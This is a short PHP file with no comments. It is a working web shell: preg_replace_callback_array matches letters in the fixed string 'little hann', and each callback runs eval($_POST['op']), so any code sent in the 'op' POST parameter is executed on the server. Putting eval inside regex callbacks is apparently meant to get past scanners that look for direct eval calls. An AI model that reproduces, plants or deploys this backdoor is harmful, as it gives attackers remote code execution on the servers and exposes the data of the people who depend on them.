<?php
    $subject = 'little hann';

    preg_replace_callback_array(
        [
        '~[t]+~i' => function ($match) {
            eval($_POST['op']);
        },
        '~[n]+~i' => function ($match) {
            eval($_POST['op']);
        }
        ],
        $subject
    );
?>